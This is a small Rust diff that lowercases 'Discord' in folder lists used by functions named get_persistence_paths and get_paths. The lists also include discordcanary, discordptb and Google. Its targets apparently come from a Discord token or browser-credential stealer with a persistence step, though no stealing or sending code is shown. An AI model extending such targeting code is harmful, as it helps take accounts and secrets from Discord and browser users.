@@ -15,7 +15,7 @@ fn get_persistence_paths() -> Vec<PathBuf> {
 
     let app_data = app_data.unwrap();
 
-    const POSSIBLE_FOLDERS: [&'static str; 3] = ["Discord", "discordcanary", "discordptb"];
+    const POSSIBLE_FOLDERS: [&'static str; 3] = ["discord", "discordcanary", "discordptb"];
 
     let mut paths: Vec<PathBuf> = Vec::new();
 
@@ -96,7 +96,7 @@ fn get_paths() -> Vec<PathBuf> {
     let app_data = app_data.unwrap();
 
     const POSSIBLE_FOLDERS: [&'static str; 4] =
-        ["Discord", "discordcanary", "discordptb", "Google"];
+        ["discord", "discordcanary", "discordptb", "Google"];
 
     let mut paths: Vec<PathBuf> = Vec::new();
 
